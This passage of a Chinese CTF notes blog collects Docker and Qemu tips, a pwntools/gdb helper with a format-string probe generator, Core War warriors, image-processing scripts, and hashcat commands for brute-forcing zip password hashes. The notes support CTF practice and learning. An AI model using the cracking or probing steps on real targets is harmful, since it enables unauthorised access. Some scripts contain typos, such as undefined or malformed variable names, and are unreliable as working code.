<li>注意Dockerfile命名不要改成其他的，而且要放在当前目录下</li>
<li><code>docker build --tag &#39;name&#39; .</code></li>
<li><code>docker image ls</code>：查看build的image</li>
</ul>
</li>
<li><p>interactive运行docker image： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40854482/interactive-command-in-dockerfile">https://stackoverflow.com/questions/40854482/interactive-command-in-dockerfile</a></p>
<ul>
<li><code>docker run -it &lt;image id&gt; /bin/bash</code></li>
<li>如果是web题需要开放端口： <code>docker run -it --expose &lt;container port&gt; -p &lt;host port&gt;:&lt;container port&gt; &lt;image id&gt;</code>,参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/30109037/how-can-i-forward-localhost-port-on-my-container-to-localhost-on-my-host">https://stackoverflow.com/questions/30109037/how-can-i-forward-localhost-port-on-my-container-to-localhost-on-my-host</a></li>
</ul>
</li>
<li><p>从Container里拷贝文件到本机： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host">https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host</a></p>
<ul>
<li>查看container id&#x2F;name（不要和上面的image id搞混了）：<code>docker container ls</code></li>
<li>libc等文件的路径： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5925678/location-of-c-standard-library">https://stackoverflow.com/questions/5925678/location-of-c-standard-library</a> 。或者直接用<code>ldd binary</code>获取路径</li>
<li>今天又看见个脚本： <a target="_blank" rel="noopener" href="https://github.com/rerrorctf/ret/blob/main/commands/libc.go">https://github.com/rerrorctf/ret/blob/main/commands/libc.go</a> ，可以直接将container里的libc提取出来</li>
</ul>
</li>
<li><p><code>docker run -it &lt;image id&gt; /bin/bash -v pwd1:pwd2</code></p>
<ul>
<li>与docker container共享目录。本机上的pwd1目录等同于container内部的pwd2目录</li>
</ul>
</li>
</ul>
<h2 id="Qemu-arm-amd64-x86-arm"><a href="#Qemu-arm-amd64-x86-arm" class="headerlink" title="Qemu arm-&gt;amd64&#x2F;x86-&gt;arm"></a>Qemu arm-&gt;amd64&#x2F;x86-&gt;arm</h2><ul>
<li>arm-&gt;amd64<ul>
<li><a target="_blank" rel="noopener" href="https://rw1nd.github.io/2021/04/13/x86-on-arm/">https://rw1nd.github.io/2021/04/13/x86-on-arm/</a></li>
<li><a target="_blank" rel="noopener" href="https://levelup.gitconnected.com/running-amd64-linux-on-apple-m1-with-qemu-utm-64d67cccd6f8">https://levelup.gitconnected.com/running-amd64-linux-on-apple-m1-with-qemu-utm-64d67cccd6f8</a></li>
</ul>
</li>
<li>x86-&gt;arm<ul>
<li><a target="_blank" rel="noopener" href="https://azeria-labs.com/arm-on-x86-qemu-user/">https://azeria-labs.com/arm-on-x86-qemu-user/</a></li>
</ul>
</li>
</ul>
<h2 id="gdb调试脚本"><a href="#gdb调试脚本" class="headerlink" title="gdb调试脚本"></a>gdb调试脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>] <span class="comment">#分屏后ctrl+b o组合键切屏</span></span><br><span class="line">p=process(<span class="string">&quot;gdb&quot;</span>)</span><br><span class="line">sla=<span class="keyword">lambda</span> d,payload:p.sendlineafter(d,payload)</span><br><span class="line">ia=<span class="keyword">lambda</span>:p.interactive()</span><br><span class="line">ra=<span class="keyword">lambda</span> timeout=<span class="number">0.5</span>:p.recvall(timeout=timeout)</span><br><span class="line">rl=<span class="keyword">lambda</span> keep=<span class="literal">False</span>:p.recvline(keepends=keep)</span><br><span class="line">sl=<span class="keyword">lambda</span> payload:p.sendline(payload)</span><br><span class="line">rls=<span class="keyword">lambda</span> line:p.recvlines(line)</span><br><span class="line">ru=<span class="keyword">lambda</span> payload,drop=<span class="literal">True</span>:p.recvuntil(payload,drop)</span><br><span class="line">cl=<span class="keyword">lambda</span>:p.close()</span><br><span class="line">s=<span class="keyword">lambda</span> payload:p.send(payload)</span><br><span class="line">base=<span class="number">0x555555554000</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PIEDebug</span>(<span class="params">file,breakpoints,params=[]</span>):</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">f&quot;file <span class="subst">&#123;file&#125;</span>&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">f&quot;starti <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(params)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> breakpoints:</span><br><span class="line">        sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">f&quot;b *<span class="subst">&#123;base+i&#125;</span>&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_format_string</span>(<span class="params">times,start=<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start,start+times):</span><br><span class="line">        payload+=<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:%<span class="subst">&#123;i&#125;</span>$p&#x27;</span>+end</span><br><span class="line">    <span class="keyword">return</span> payload[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register</span>(<span class="params">reg</span>):</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">&quot;i r&quot;</span>)</span><br><span class="line">    contents=ru(<span class="string">&quot;gs&quot;</span>).split(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> contents:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        temp=i.split()</span><br><span class="line">        register=temp[<span class="number">0</span>]</span><br><span class="line">        value=temp[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> reg.encode() <span class="keyword">in</span> register:</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;none&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_register</span>(<span class="params">register,value</span>):</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">f&quot;set $<span class="subst">&#123;register&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="基础波形图绘制脚本"><a href="#基础波形图绘制脚本" class="headerlink" title="基础波形图绘制脚本"></a>基础波形图绘制脚本</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/371394137">参考</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d=f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">traces=<span class="built_in">eval</span>(d[<span class="number">1</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">t=np.arange(<span class="number">0</span>, <span class="built_in">len</span>(traces))</span><br><span class="line">plt.plot(t, traces)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="linux命令替代"><a href="#linux命令替代" class="headerlink" title="linux命令替代"></a>linux命令替代</h2><ul>
<li><a target="_blank" rel="noopener" href="https://ubunlog.com/en/alternativas-al-comando-ls/">ls</a></li>
<li><a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/86321/how-can-i-display-the-contents-of-a-text-file-on-the-command-line">cat</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/03/29/picoctf-2023-writeups/#specialer">Specialer</a>:<code>for f in **/*; do echo $(&lt;$f); done</code></li>
</ul>
<h2 id="Core-war"><a href="#Core-war" class="headerlink" title="Core war"></a>Core war</h2><ul>
<li><a target="_blank" rel="noopener" href="https://corewar.co.uk/index.htm">Core War</a></li>
<li><a target="_blank" rel="noopener" href="http://www.koth.org/info.html">koth</a></li>
</ul>
<p>以下warrior都是standard redcode。</p>
<p>一个稳输的自毁warrior：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;redcode</span><br><span class="line">;assert 1</span><br><span class="line">ADD #-1, 3</span><br><span class="line">MOV 2, @2</span><br><span class="line">JMP -2</span><br><span class="line">DAT #0, #0</span><br></pre></td></tr></table></figure>

<p>一个稍微能赢一点的基础warrior(dwarf)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;redcode</span><br><span class="line">;assert 1</span><br><span class="line">start   add.ab  #4, bmb</span><br><span class="line">        mov.i   bmb, @bmb</span><br><span class="line">        jmp     start</span><br><span class="line">bmb     dat     #0, #0</span><br></pre></td></tr></table></figure>

<p>一个胜率较高的warrior：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">;redcode</span><br><span class="line">;assert 1</span><br><span class="line">        org    start</span><br><span class="line"></span><br><span class="line">gate    dat    4000,       1700</span><br><span class="line">bomb    dat    &gt;2667,      11</span><br><span class="line"></span><br><span class="line">        for    4</span><br><span class="line">        dat    0,0</span><br><span class="line">        rof</span><br><span class="line"></span><br><span class="line">        spl    #4000,      &gt;gate</span><br><span class="line">clear   mov    bomb,       &gt;gate</span><br><span class="line">        djn.f  clear,      &gt;gate</span><br><span class="line"></span><br><span class="line">        for    23</span><br><span class="line">        dat    0,0</span><br><span class="line">        rof</span><br><span class="line"></span><br><span class="line">        istep  equ 1143           ; (CORESIZE+1)/7</span><br><span class="line"></span><br><span class="line">start   spl    clear-1</span><br><span class="line">        mov    imp,        *launch</span><br><span class="line">        spl    1                  ; 32 parallel processes</span><br><span class="line">        spl    1</span><br><span class="line">        spl    1</span><br><span class="line">        spl    1</span><br><span class="line">        spl    1</span><br><span class="line">        spl    nxpoint</span><br><span class="line">launch  djn.f  3600,       &lt;4000</span><br><span class="line"></span><br><span class="line">        for    2</span><br><span class="line">        dat    0,0</span><br><span class="line">        rof</span><br><span class="line"></span><br><span class="line">nxpoint add.f  #istep,     launch</span><br><span class="line">        djn.f  clear-1,    &lt;3000</span><br><span class="line"></span><br><span class="line">imp     mov.i  #1,         istep</span><br></pre></td></tr></table></figure>

<h2 id="打印嵌套文件夹内的所有文件内容"><a href="#打印嵌套文件夹内的所有文件内容" class="headerlink" title="打印嵌套文件夹内的所有文件内容"></a>打印嵌套文件夹内的所有文件内容</h2><p><code>find /path/to/folder -type f -exec cat &#123;&#125; \;</code></p>
<h2 id="python画二维码"><a href="#python画二维码" class="headerlink" title="python画二维码"></a>python画二维码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">100</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX, MAX))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;qr.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">m = file.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">		<span class="keyword">if</span>(m[i] == <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">			pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">		i = i+<span class="number">1</span></span><br><span class="line">pic.save(<span class="string">&quot;res.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">data = np.zeros((<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;qr.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> f:</span><br><span class="line">        bit = <span class="built_in">int</span>(bit)</span><br><span class="line">        data[idx // <span class="number">100</span>][idx % <span class="number">100</span>] = bit</span><br><span class="line"></span><br><span class="line">        idx = idx + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">plt.imshow(data, interpolation = <span class="string">&quot;nearest&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="python-cv2描绘运动轨迹"><a href="#python-cv2描绘运动轨迹" class="headerlink" title="python cv2描绘运动轨迹"></a>python cv2描绘运动轨迹</h2><p>利用前后帧生成光流，如果该光流往左下走则描绘出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2,numpy <span class="keyword">as</span> np,matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">cap = cv2.VideoCapture(<span class="string">&#x27;out_flag.mp4&#x27;</span>)</span><br><span class="line">ret, frame = cap.read()</span><br><span class="line">gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)</span><br><span class="line">mask = np.zeros_like(gray).astype(np.float64)</span><br><span class="line">fr = <span class="number">0</span></span><br><span class="line">plt.figure(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fr +=<span class="number">1</span></span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    gray_next = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    flow = cv2.calcOpticalFlowFarneback(gray, gray_next, <span class="literal">None</span>, <span class="number">0.5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1.2</span>, <span class="number">0</span>)</span><br><span class="line">    h, w = gray.shape</span><br><span class="line">    y, x = np.mgrid[<span class="number">0</span>:h:<span class="number">10</span>, <span class="number">0</span>:w:<span class="number">10</span>].reshape(<span class="number">2</span>, -<span class="number">1</span>).astype(<span class="built_in">int</span>)</span><br><span class="line">    fx, fy = flow[y, x].T</span><br><span class="line">    lines = np.vstack([x, y, x + fx, y + fy]).T.reshape(-<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">    lines = np.int32(lines + <span class="number">0.5</span>)</span><br><span class="line">    vis = np.zeros_like(gray)</span><br><span class="line">    <span class="keyword">for</span> (x1, y1), (x2, y2) <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> x1 &gt; x2  <span class="keyword">and</span> y1&lt;y2:</span><br><span class="line">            cv2.line(vis, (x1, y1), (x2, y2), <span class="number">255</span> , <span class="number">2</span>)</span><br><span class="line">    mask += vis&amp;gray</span><br><span class="line">    <span class="keyword">if</span> fr % <span class="number">10</span> ==<span class="number">0</span>:</span><br><span class="line">        show=mask.copy()</span><br><span class="line">        cv2.putText(show,<span class="string">f&#x27;<span class="subst">&#123;fr&#125;</span>&#x27;</span>,(<span class="number">5</span>,<span class="number">50</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.75</span>, <span class="number">255</span>, <span class="number">2</span>)</span><br><span class="line">        cv2.imshow(<span class="string">&#x27;frame2&#x27;</span>, show)</span><br><span class="line">        <span class="keyword">if</span> cv2.waitKey(<span class="number">25</span>) &amp; <span class="number">0xFF</span> == <span class="built_in">ord</span>(<span class="string">&#x27;q&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gray=gray_next</span><br><span class="line">plt.imshow(np.log(mask))</span><br><span class="line">plt.imshow(np.log(mask+<span class="number">1</span>))</span><br><span class="line">plt.show()</span><br><span class="line">cap.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>

<h2 id="Visual-cryptography-python脚本"><a href="#Visual-cryptography-python脚本" class="headerlink" title="Visual cryptography python脚本"></a><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Visual_cryptography">Visual cryptography</a> python脚本</h2><p>大概就是把两张黑白图片叠在一起，就能看见要传递的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im1 = Image.<span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>)</span><br><span class="line">im2 = Image.<span class="built_in">open</span>(<span class="string">&quot;2.png&quot;</span>)</span><br><span class="line">iminp = np.array(im1)</span><br><span class="line">im2np = np.array(im2)</span><br><span class="line">result = im2np + im1inp</span><br><span class="line">Image.fromarray(result).save(<span class="string">&#x27;result.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>或者把信息用白色显现出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment"># Load the first share</span></span><br><span class="line">sharel = Image.<span class="built_in">open</span>(<span class="string">&quot;img1.png&quot;</span>) .convert(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># Load the second share</span></span><br><span class="line">share2 = Image.<span class="built_in">open</span>(<span class="string">&quot;img2.png&quot;</span>) .convert(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># Get the size of the shares</span></span><br><span class="line">width, height = sharel.size</span><br><span class="line"><span class="comment"># Create a new image for the result</span></span><br><span class="line">result = Image.new(<span class="string">&quot;1&quot;</span>, (width, height))</span><br><span class="line"><span class="comment"># Loop through each pixel in the shares and combine them</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (width) :</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (height):</span><br><span class="line">        pixell = sharel.getpixel((x, y))</span><br><span class="line">        pixel2 = share2.getpixel((x, y))</span><br><span class="line">        <span class="comment"># If both pixels are black, set the result pixel to black</span></span><br><span class="line">        <span class="keyword">if</span> pixell == <span class="number">0</span> <span class="keyword">and</span> pixel2 == <span class="number">0</span>:</span><br><span class="line">            result.putpixel((x, y), <span class="number">0</span>)</span><br><span class="line">        <span class="comment"># Otherwise, set the result pixel to white</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.putpixel((x, y), <span class="number">255</span>)</span><br><span class="line"><span class="comment"># Save the resulting image</span></span><br><span class="line">result.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="perlin-noise图片生成-对比脚本"><a href="#perlin-noise图片生成-对比脚本" class="headerlink" title="perlin noise图片生成+对比脚本"></a><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Perlin_noise">perlin noise</a>图片生成+对比脚本</h2><p>使用python模块<a target="_blank" rel="noopener" href="https://github.com/caseman/noise">noise</a>用perlin noise生成一张图片后对比另一张由perlin noise生成的图片，并把像素不同的地方标为黑色后写为结果图片。改一下也能用作两张普通图片的对比脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> noise</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># Set the seed for the Perlin noise generator</span></span><br><span class="line">seed = <span class="number">2151</span></span><br><span class="line"><span class="comment"># Set the size of the image</span></span><br><span class="line">width = <span class="number">1920</span></span><br><span class="line">height = <span class="number">1080</span></span><br><span class="line"><span class="comment"># Set the scale of the Perlin noise</span></span><br><span class="line">scale = <span class="number">100.0</span></span><br><span class="line"><span class="comment"># Create an empty NumPy array for the image</span></span><br><span class="line">img_array = np.zeros((height, width))</span><br><span class="line"><span class="comment"># Loop through each pixel in the image and generate Perlin noise</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        img_array[y, x] = noise.pnoise2(x/scale, y/scale, octaves=<span class="number">6</span>, persistence=<span class="number">0.5</span>, lacunarity=<span class="number">2.0</span>,repeatx=<span class="number">1024</span>, repeaty=<span class="number">1024</span>, base=seed)</span><br><span class="line"><span class="comment"># Create a PIL image from the NumPy array</span></span><br><span class="line">img = Image.fromarray(np.uint8(img_array * <span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&quot;res.png&quot;</span>)</span><br><span class="line"><span class="comment"># Load the modified image</span></span><br><span class="line">mod_img = Image.<span class="built_in">open</span>(<span class="string">&#x27;compare.png’&#x27;</span>)</span><br><span class="line"><span class="comment"># Create a new black image for the changed pixels</span></span><br><span class="line">new_img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"><span class="comment"># Get the pixel access objects for the images</span></span><br><span class="line">orig_pixels = img.load()</span><br><span class="line">mod_pixels = mod_img.load()</span><br><span class="line">new_pixels = new_img.load()</span><br><span class="line"><span class="comment"># Loop through the pixels and identify changed pixels</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        orig_pixel = orig_pixels[x, y]</span><br><span class="line">        mod_pixel = mod_ pixels[x, y]</span><br><span class="line">        <span class="keyword">if</span> orig_pixel != mod_pixel:</span><br><span class="line">            <span class="comment"># Change the pixel in the new image to white</span></span><br><span class="line">            new_pixels[x, y] = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line"><span class="comment"># Save the new image with the changed pixels in white</span></span><br><span class="line">new_img.save(<span class="string">&#x27;changed_pixels_flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="hashcat使用"><a href="#hashcat使用" class="headerlink" title="hashcat使用"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4008">hashcat使用</a></h2><p>下载：在<a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">官网</a>下载hashcat binaries，然后用<code>7z x</code>解压文件即可(7zip下载：<code>sudo apt-get install p7zip-full</code>)。linux运行<code>hashcat.bin</code>,windows运行<code>hashcat.exe</code>。</p>
<p>今天又测试了一下这个方法，发现不行。然后发现可以直接用apt安装hashcat，但是安装后用hashcat命令也不行。最后发现用apt安装hashcat后之前下载的那个binary就能用了……</p>
<p>运行时指定hash模式的-m选项可以在<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">这里</a>找到。例如爆破zip，先用<a target="_blank" rel="noopener" href="https://hashes.com/en/johntheripper/zip2john">zip2john</a>将zip转为hash，然后根据hash格式选择-m的参数。-a是爆破模式。</p>
<ul>
<li>掩码爆破：<code>./hashcat.bin -a 3 -m 13600 &#39;hash&#39; mask</code></li>
<li>字典爆破：<code>./hashcat.bin -a 0 -m 13600 &#39;hash&#39; dict</code></li>
</ul>
